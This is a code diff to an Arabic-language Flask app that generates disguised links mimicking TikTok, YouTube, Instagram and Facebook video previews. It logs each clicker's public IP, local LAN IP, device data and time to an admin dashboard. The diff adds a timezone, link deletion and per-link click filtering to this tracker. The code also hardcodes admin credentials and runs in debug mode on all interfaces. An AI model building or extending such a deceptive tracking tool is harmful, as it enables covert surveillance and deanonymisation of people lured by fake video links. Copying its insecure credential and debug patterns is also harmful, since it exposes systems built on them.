@@ -3,6 +3,7 @@ import uuid
 import datetime
 import sqlite3
 import requests
+import pytz
 from functools import wraps
 
 app = Flask(__name__)
@@ -10,6 +11,13 @@ app = Flask(__name__)
 DB_FILE = "tracker_data.db"
 USERNAME = "khaled"
 PASSWORD = "ALG@2022"
+
+# إعداد المنطقة الزمنية GMT+1 (توقيت الجزائر)
+ALGIERS_TZ = pytz.timezone('Africa/Algiers')
+
+def get_gmt1_time():
+    """الحصول على الوقت الحالي بصيغة GMT+1"""
+    return datetime.datetime.now(ALGIERS_TZ).strftime("%Y-%m-%d %H:%M:%S")
 
 def init_db():
     with sqlite3.connect(DB_FILE) as conn:
@@ -32,22 +40,19 @@ def init_db():
                 local_ip TEXT,
                 device TEXT,
                 time TEXT,
-                FOREIGN KEY(link_id) REFERENCES links(id)
+                FOREIGN KEY(link_id) REFERENCES links(id) ON DELETE CASCADE
             )
         ''')
         conn.commit()
 
 init_db()
 
-# دالة ذكية لتحديد المنصة وجلب بيانات المعاينة تلقائياً أو عبر الرابط اليدوي
 def get_platform_meta(url, manual_thumb_url=None):
     url_lower = url.lower()
-    
     platform_name = "Video"
     default_title = "شاهد مقطع الفيديو الرائج"
     default_img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
     
-    # 1. جلب تلقائي لتيك توك عبر oEmbed
     if "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
         platform_name = "TikTok"
         default_img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
@@ -60,7 +65,6 @@ def get_platform_meta(url, manual_thumb_url=None):
         except:
             pass
             
-    # 2. جلب تلقائي ليوتيوب عبر oEmbed
     elif "youtube.com" in url_lower or "youtu.be" in url_lower:
         platform_name = "YouTube"
         default_img = "https://images.unsplash.com/photo-1611162616305-c67b3fa40904?w=600"
@@ -73,14 +77,12 @@ def get_platform_meta(url, manual_thumb_url=None):
         except:
             pass
             
-    # 3. معالجة روابط انستغرام (يدعم الرابط اليدوي للصورة)
     elif "instagram.com" in url_lower:
         platform_name = "Instagram"
         title = "Instagram Video • شاهد المقطع على انستغرام"
         img = manual_thumb_url.strip() if manual_thumb_url and manual_thumb_url.strip() else "https://images.unsplash.com/photo-1611262588024-d12430b98920?w=600"
         return platform_name, title, img
 
-    # 4. معالجة روابط فيسبوك (يدعم الرابط اليدوي للصورة)
     elif "facebook.com" in url_lower or "fb.watch" in url_lower:
         platform_name = "Facebook"
         title = "Facebook Video • شاهد المقطع على فيسبوك"
@@ -114,7 +116,7 @@ HTML_LAYOUT = '''
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; color: #333; margin: 0; padding: 0; }
         .navbar { background-color: #1a252f; color: white; padding: 15px; text-align: center; font-size: 18px; font-weight: bold; }
-        .container { max-width: 900px; margin: 15px auto; padding: 15px; box-sizing: border-box; }
+        .container { max-width: 1050px; margin: 15px auto; padding: 15px; box-sizing: border-box; }
         .stats-overview { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; }
         .stat-card { background: white; padding: 15px; border-radius: 8px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border-top: 4px solid #34495e; }
         .stat-card h3 { margin: 0; font-size: 13px; color: #7f8c8d; }
@@ -123,13 +125,13 @@ HTML_LAYOUT = '''
         .create-box h2 { margin-top: 0; font-size: 16px; color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 5px; }
         label { font-weight: bold; display: block; margin-top: 10px; font-size: 14px; color: #555; }
         input[type="text"], input[type="url"] { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
-        button { width: 100%; background-color: #3498db; color: white; border: none; padding: 12px; margin-top: 15px; border-radius: 4px; font-size: 15px; font-weight: bold; cursor: pointer; }
-        .section-title { font-size: 16px; color: #2c3e50; margin: 20px 0 10px 0; font-weight: bold; }
+        button.submit-btn { width: 100%; background-color: #3498db; color: white; border: none; padding: 12px; margin-top: 15px; border-radius: 4px; font-size: 15px; font-weight: bold; cursor: pointer; }
+        .section-title { font-size: 16px; color: #2c3e50; margin: 20px 0 10px 0; font-weight: bold; display: flex; justify-content: space-between; align-items: center; }
         .table-wrapper { background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); overflow-x: auto; margin-bottom: 25px; }
         .main-table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: center; }
         .main-table th, .main-table td { padding: 12px 10px; border-bottom: 1px solid #edf2f7; }
         .main-table th { background-color: #34495e; color: white; }
-        .link-text { color: #3498db; text-decoration: none; word-break: break-all; font-size: 12px; }
+        .link-text { color: #3498db; text-decoration: none; word-break: break-all; font-size: 12px; font-weight: bold; }
         .badge { background: #e74c3c; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
         .platform-badge { display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 11px; font-weight: bold; color: white; }
         .bg-tiktok { background-color: #010101; }
@@ -142,14 +144,18 @@ HTML_LAYOUT = '''
         .logs-table th, .logs-table td { padding: 10px; border: 1px solid #e2e8f0; }
         .logs-table th { background-color: #2c3e50; color: white; }
         
-        /* تصميم الحقل الإضافي والأزرار الخارجية */
+        /* أزرار التحكم الجديدة وحقول التعديل */
+        .action-btn { padding: 5px 10px; font-size: 11px; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; margin: 2px; color: white; }
+        .btn-delete { background-color: #e74c3c; }
+        .btn-stats { background-color: #3498db; }
+        .btn-clear-filter { background-color: #95a5a6; color: white; padding: 4px 8px; font-size: 12px; border-radius: 4px; text-decoration: none; }
+        
         #manual_thumb_section { display: none; margin-top: 15px; padding: 10px; background: #f8f9fa; border-left: 4px solid #3498db; border-radius: 4px; }
         .downloader-btn { display: none; display: inline-block; background-color: #2ecc71; color: white; padding: 8px 12px; margin-top: 8px; text-decoration: none; border-radius: 4px; font-size: 12px; font-weight: bold; }
-        .downloader-btn:hover { background-color: #27ae60; }
     </style>
 </head>
 <body>
-    <div class="navbar"> لوحة الإدارة الذكية (دمج التلقائي واليدوي للمنصات)</div>
+    <div class="navbar">لوحة الإدارة الذكية (تحديث نظام الحذف، الإحصائيات و GMT+1)</div>
     <div class="container">
         
         <div class="stats-overview">
@@ -170,21 +176,20 @@ HTML_LAYOUT = '''
                 <input type="url" id="original_url" name="original_url" placeholder="https://..." oninput="checkPlatform()" required>
                 
                 <div id="manual_thumb_section">
-                    <label id="thumb_label">رابط الصورة المصغرة اليدوي:</label>
-                    <input type="url" name="manual_thumbnail" placeholder="ضع رابط الصورة المباشر هنا المجلوب من موقع التحميل">
-                    
-                    <a href="https://thumbnail-downloader.com/facebook/" id="fb_btn" class="downloader-btn" target="_blank">🌐 فتح موقع استخراج صور الفيسبوك</a>
-                    <a href="https://thumbnail-downloader.com/instagram/" id="ig_btn" class="downloader-btn" target="_blank">🌐 فتح موقع استخراج صور الانستغرام</a>
+                    <label>رابط الصورة المصغرة اليدوي:</label>
+                    <input type="url" name="manual_thumbnail" placeholder="ضع رابط الصورة المباشر هنا">
+                    <a href="https://thumbnail-downloader.com/facebook/" id="fb_btn" class="downloader-btn" target="_blank">🌐 فتح موقع صور الفيسبوك</a>
+                    <a href="https://thumbnail-downloader.com/instagram/" id="ig_btn" class="downloader-btn" target="_blank">🌐 فتح موقع صور الانستغرام</a>
                 </div>
 
                 <label>ملاحظة لتمييز الرابط:</label>
                 <input type="text" name="note" placeholder="مثال: حملة المقطع الحزين" required>
                 
-                <button type="submit">إنشاء وتجهيز المعاينة المطابقة</button>
+                <button type="submit" class="submit-btn">إنشاء وتجهيز المعاينة المطابقة</button>
             </form>
         </div>
 
-        <div class="section-title"> الروابط النشطة الحالية ومحاكاة المنصات</div>
+        <div class="section-title"> الروابط النشطة وإجراءات التحكم</div>
         <div class="table-wrapper">
             <table class="main-table">
                 <thead>
@@ -195,12 +200,13 @@ HTML_LAYOUT = '''
                         <th>النقرات</th>
                         <th>الرابط الذكي للمشاركة</th>
                         <th>صورة المعاينة</th>
+                        <th>التحكم</th>
                     </tr>
                 </thead>
                 <tbody>
                     {% if not links_list %}
                     <tr>
-                        <td colspan="6" style="padding: 20px; color: #95a5a6;">لا توجد روابط منشأة حالياً.</td>
+                        <td colspan="7" style="padding: 20px; color: #95a5a6;">لا توجد روابط منشأة حالياً.</td>
                     </tr>
                     {% else %}
                         {% for link in links_list %}
@@ -211,11 +217,15 @@ HTML_LAYOUT = '''
                                     {{ link.platform }}
                                 </span>
                             </td>
-                            <td style="max-width: 130px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">{{ link.video_title }}</td>
+                            <td style="max-width: 120px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">{{ link.video_title }}</td>
                             <td><span class="badge">{{ link.clicks_count }}</span></td>
                             <td><a class="link-text" href="/secure/{{ link.id }}" target="_blank">{{ host_url }}secure/{{ link.id }}</a></td>
                             <td>
                                 <img src="{{ link.custom_image }}" width="50" height="40" style="border-radius:4px; object-fit:cover;" onerror="this.src='https://placehold.co/50x40/7f8c8d/white?text=No+Img'">
+                            </td>
+                            <td>
+                                <a href="/?filter_id={{ link.id }}#logs_section" class="action-btn btn-stats">📊 الإحصائيات</a>
+                                <a href="/delete/{{ link.id }}" class="action-btn btn-delete" onclick="return confirm('هل أنت متأكد من حذف هذا الرابط نهائياً بجميع نقراته؟');">🗑️ حذف</a>
                             </td>
                         </tr>
                         {% endfor %}
@@ -224,13 +234,18 @@ HTML_LAYOUT = '''
             </table>
         </div>
 
-        <div class="section-title"> سجل الأجهزة المباشر (Logs)</div>
+        <div id="logs_section" class="section-title">
+            <span> S سجل الأجهزة المباشر (توقيت الجزائر GMT+1) {% if current_filter %} [تمت الفلترة] {% endif %}</span>
+            {% if current_filter %}
+                <a href="/" class="btn-clear-filter">🔄 عرض السجل الكامل (الكل)</a>
+            {% endif %}
+        </div>
         <div class="logs-box">
             <table class="logs-table">
                 <thead>
                     <tr>
                         <th>الرابط (الملاحظة)</th>
-                        <th>الوقت (Date/Time)</th>
+                        <th>الوقت (Date/Time GMT+1)</th>
                         <th>الـ IP العام</th>
                         <th>الـ IP المحلي (LAN)</th>
                         <th>بيانات الهاتف والمتصفح</th>
@@ -239,7 +254,7 @@ HTML_LAYOUT = '''
                 <tbody>
                     {% if not clicks_list %}
                     <tr>
-                        <td colspan="5" style="padding: 20px; color: #95a5a6;">بانتظار تسجيل أول نقرة...</td>
+                        <td colspan="5" style="padding: 20px; color: #95a5a6;">لا توجد نقرات مسجلة لهذا التحديد حالياً...</td>
                     </tr>
                     {% else %}
                         {% for click in clicks_list %}
@@ -287,6 +302,8 @@ HTML_LAYOUT = '''
 @app.route('/')
 @requires_auth
 def home():
+    filter_id = request.args.get('filter_id') # معرف الفلترة عند طلب إحصائية رابط معين
+    
     with sqlite3.connect(DB_FILE) as conn:
         conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
@@ -298,29 +315,36 @@ def home():
         ''')
         links_list = cursor.fetchall()
         
-        cursor.execute('''
-            SELECT c.ip, c.local_ip, c.device, c.time, l.note 
-            FROM clicks c JOIN links l ON c.link_id = l.id 
-            ORDER BY c.id DESC
-        ''')
+        # جلب السجل؛ مفلتر أو كامل بناءً على اختيار المستخدم لزر الإحصائيات
+        if filter_id:
+            cursor.execute('''
+                SELECT c.ip, c.local_ip, c.device, c.time, l.note 
+                FROM clicks c JOIN links l ON c.link_id = l.id 
+                WHERE l.id = ?
+                ORDER BY c.id DESC
+            ''', (filter_id,))
+        else:
+            cursor.execute('''
+                SELECT c.ip, c.local_ip, c.device, c.time, l.note 
+                FROM clicks c JOIN links l ON c.link_id = l.id 
+                ORDER BY c.id DESC
+            ''')
         clicks_list = cursor.fetchall()
         
         total_links = len(links_list)
         cursor.execute("SELECT COUNT(*) FROM clicks")
         total_clicks = cursor.fetchone()[0]
 
-    return render_template_string(HTML_LAYOUT, links_list=links_list, clicks_list=clicks_list, host_url=request.host_url, total_links=total_links, total_clicks=total_clicks)
+    return render_template_string(HTML_LAYOUT, links_list=links_list, clicks_list=clicks_list, host_url=request.host_url, total_links=total_links, total_clicks=total_clicks, current_filter=filter_id)
 
 @app.route('/create', methods=['POST'])
 @requires_auth
 def create():
     original_url = request.form.get('original_url')
-    manual_thumbnail = request.form.get('manual_thumbnail', '') # جلب رابط الصورة اليدوي
+    manual_thumbnail = request.form.get('manual_thumbnail', '')
     note = request.form.get('note')
     
-    # التعرف التلقائي لليوتيوب والتيك توك، وقبول الصورة اليدوية للفيسبوك والانستغرام
     platform, video_title, custom_image = get_platform_meta(original_url, manual_thumbnail)
-    
     link_id = str(uuid.uuid4())[:6].upper()
     
     with sqlite3.connect(DB_FILE) as conn:
@@ -331,6 +355,18 @@ def create():
         ''', (link_id, original_url, note, video_title, custom_image, platform))
         conn.commit()
         
+    return redirect('/')
+
+# مسار مسجل لحذف الرابط ونقراته التابعة له
+@app.route('/delete/<link_id>')
+@requires_auth
+def delete_link(link_id):
+    with sqlite3.connect(DB_FILE) as conn:
+        cursor = conn.cursor()
+        # تفعيل خاصية الحذف المتتالي (Foreign Key Cascade) لحذف النقرات تلقائياً
+        cursor.execute("PRAGMA foreign_keys = ON")
+        cursor.execute("DELETE FROM links WHERE id = ?", (link_id,))
+        conn.commit()
     return redirect('/')
 
 @app.route('/secure/<link_id>')
@@ -455,7 +491,9 @@ def log_click(link_id):
         ip_address = ip_address.split(',')[0].strip()
         
     user_agent = request.headers.get('User-Agent')
-    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # استخدام الدالة الجديدة لحفظ الوقت بتوقيت الجزائر GMT+1
+    current_time = get_gmt1_time()
     
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
@@ -468,4 +506,5 @@ def log_click(link_id):
     return jsonify({"status": "success"}), 200
 
 if __name__ == '__main__':
+    # لتشغيل الكود بنجاح يرجى التأكد من تثبيت مكتبة pytz عبر أداة pip (pip install pytz)
     app.run(debug=True, host='0.0.0.0', port=5000)
